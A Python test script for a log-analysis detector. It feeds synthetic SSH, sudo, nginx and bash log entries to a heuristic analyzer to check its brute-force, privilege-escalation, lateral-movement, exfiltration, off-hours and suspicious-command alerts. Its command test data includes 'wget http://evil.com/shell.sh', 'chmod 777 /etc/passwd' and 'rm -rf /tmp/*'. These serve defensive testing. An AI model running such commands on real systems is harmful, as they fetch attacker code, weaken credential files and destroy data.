"""
Test script for heuristic-based analysis
Tests brute force, privilege escalation, lateral movement, and other heuristic patterns
"""
import sys
import asyncio
from pathlib import Path
from datetime import datetime, timedelta

# Add backend to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from analyzers.heuristic_analyzer import HeuristicAnalyzer
from storage.models import LogEntry
import structlog

logger = structlog.get_logger()


async def test_heuristic_analyzer():
    """Test the heuristic analyzer with sample attack patterns"""
    
    print("=" * 70)
    print("Testing Heuristic-Based Analysis")
    print("=" * 70)
    
    # Initialize analyzer
    print("\n1. Initializing heuristic analyzer...")
    analyzer = HeuristicAnalyzer()
    print(f"✓ Initialized with {len(analyzer.rules)} heuristic rules")
    
    # Test 1: Brute Force Pattern (failed logins → success)
    print("\n2. Testing brute force pattern detection...")
    brute_force_logs = []
    base_time = datetime.now()
    
    # 5 failed login attempts
    for i in range(5):
        brute_force_logs.append(LogEntry(
            id=f"bf-{i}",
            timestamp=(base_time + timedelta(seconds=i)).isoformat(),
            raw=f"2024-12-08 01:00:{i:02d} ssh-server sshd: Failed password for admin from 203.0.113.1",
            message=f"Failed password for admin from 203.0.113.1 port 22 ssh2",
            appname="sshd",
            host="ssh-server",
            normalized={"user": "admin", "source_ip": "203.0.113.1", "action": "failed_login"}
        ))
    
    # 1 successful login
    brute_force_logs.append(LogEntry(
        id="bf-success",
        timestamp=(base_time + timedelta(seconds=6)).isoformat(),
        raw="2024-12-08 01:00:06 ssh-server sshd: Accepted password for admin from 203.0.113.1",
        message="Accepted password for admin from 203.0.113.1 port 22 ssh2",
        appname="sshd",
        host="ssh-server",
        normalized={"user": "admin", "source_ip": "203.0.113.1", "action": "login"}
    ))
    
    alerts = await analyzer.analyze(brute_force_logs)
    print(f"✓ Brute force pattern: {len(alerts)} alerts generated")
    if alerts:
        for alert in alerts:
            print(f"  - {alert.description}")
    
    # Test 2: Privilege Escalation
    print("\n3. Testing privilege escalation detection...")
    priv_esc_logs = []
    
    # Normal login
    priv_esc_logs.append(LogEntry(
        id="pe-1",
        timestamp=base_time.isoformat(),
        raw="2024-12-08 01:10:00 server-01 sshd: Accepted publickey for user1 from 192.168.1.100",
        message="Accepted publickey for user1 from 192.168.1.100 port 22",
        appname="sshd",
        host="server-01",
        normalized={"user": "user1", "source_ip": "192.168.1.100", "action": "login"}
    ))
    
    # Privilege escalation attempt
    priv_esc_logs.append(LogEntry(
        id="pe-2",
        timestamp=(base_time + timedelta(seconds=10)).isoformat(),
        raw="2024-12-08 01:10:10 server-01 sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash",
        message="sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash",
        appname="sudo",
        host="server-01",
        normalized={"user": "user1", "command": "/bin/bash", "target_user": "root"}
    ))
    
    alerts = await analyzer.analyze(priv_esc_logs)
    print(f"✓ Privilege escalation: {len(alerts)} alerts generated")
    if alerts:
        for alert in alerts:
            print(f"  - {alert.description}")
    
    # Test 3: Lateral Movement
    print("\n4. Testing lateral movement detection...")
    lateral_logs = []
    
    # User accessing multiple hosts
    hosts = ["server-01", "server-02", "server-03", "server-04", "server-05"]
    for idx, host in enumerate(hosts):
        lateral_logs.append(LogEntry(
            id=f"lm-{idx}",
            timestamp=(base_time + timedelta(minutes=idx)).isoformat(),
            raw=f"2024-12-08 01:{idx:02d}:00 {host} sshd: Accepted publickey for deploy from 192.168.1.50",
            message=f"Accepted publickey for deploy from 192.168.1.50 port 22",
            appname="sshd",
            host=host,
            normalized={"user": "deploy", "source_ip": "192.168.1.50", "action": "login"}
        ))
    
    alerts = await analyzer.analyze(lateral_logs)
    print(f"✓ Lateral movement: {len(alerts)} alerts generated")
    if alerts:
        for alert in alerts:
            print(f"  - {alert.description}")
    
    # Test 4: Data Exfiltration
    print("\n5. Testing data exfiltration detection...")
    exfil_logs = []
    
    # Large data transfer
    exfil_logs.append(LogEntry(
        id="exfil-1",
        timestamp=base_time.isoformat(),
        raw='2024-12-08 01:30:00 web-server nginx: 45.142.212.61 - - [08/Dec/2024:01:30:00 +0000] "GET /backup/database.tar.gz HTTP/1.1" 200 250000000',
        message='GET /backup/database.tar.gz HTTP/1.1" 200 250000000',
        appname="nginx",
        host="web-server",
        normalized={"source_ip": "45.142.212.61", "bytes": 250000000, "dest_ip": "8.8.8.8"}
    ))
    
    alerts = await analyzer.analyze(exfil_logs)
    print(f"✓ Data exfiltration: {len(alerts)} alerts generated")
    if alerts:
        for alert in alerts:
            print(f"  - {alert.description}")
    
    # Test 5: Off-Hours Activity
    print("\n6. Testing off-hours activity detection...")
    off_hours_logs = []
    
    # Login at 2 AM
    off_hours_time = datetime.now().replace(hour=2, minute=30, second=0)
    off_hours_logs.append(LogEntry(
        id="oh-1",
        timestamp=off_hours_time.isoformat(),
        raw="2024-12-08 02:30:00 server-01 sshd: Accepted publickey for admin from 192.168.1.100",
        message="Accepted publickey for admin from 192.168.1.100 port 22",
        appname="sshd",
        host="server-01",
        normalized={"user": "admin", "source_ip": "192.168.1.100", "action": "login"}
    ))
    
    alerts = await analyzer.analyze(off_hours_logs)
    print(f"✓ Off-hours activity: {len(alerts)} alerts generated")
    if alerts:
        for alert in alerts:
            print(f"  - {alert.description}")
    
    # Test 6: Suspicious Commands
    print("\n7. Testing suspicious command detection...")
    cmd_logs = []
    
    # Multiple suspicious commands
    suspicious_cmds = ["rm -rf /tmp/*", "chmod 777 /etc/passwd", "wget http://evil.com/shell.sh"]
    for idx, cmd in enumerate(suspicious_cmds):
        cmd_logs.append(LogEntry(
            id=f"cmd-{idx}",
            timestamp=(base_time + timedelta(seconds=idx*10)).isoformat(),
            raw=f"2024-12-08 01:40:{idx*10:02d} server-01 bash: {cmd}",
            message=f"Command executed: {cmd}",
            appname="bash",
            host="server-01",
            normalized={"user": "user1", "command": cmd}
        ))
    
    alerts = await analyzer.analyze(cmd_logs)
    print(f"✓ Suspicious commands: {len(alerts)} alerts generated")
    if alerts:
        for alert in alerts:
            print(f"  - {alert.description}")
    
    # Summary
    print("\n" + "=" * 70)
    print("Heuristic Analysis Test Complete!")
    print("=" * 70)
    print("\nAll heuristic patterns tested:")
    print("  ✓ Brute force (failed logins → success)")
    print("  ✓ Privilege escalation (login → sudo)")
    print("  ✓ Lateral movement (multiple host access)")
    print("  ✓ Data exfiltration (large transfers)")
    print("  ✓ Off-hours activity")
    print("  ✓ Suspicious command sequences")
    print("=" * 70)


if __name__ == "__main__":
    asyncio.run(test_heuristic_analyzer())
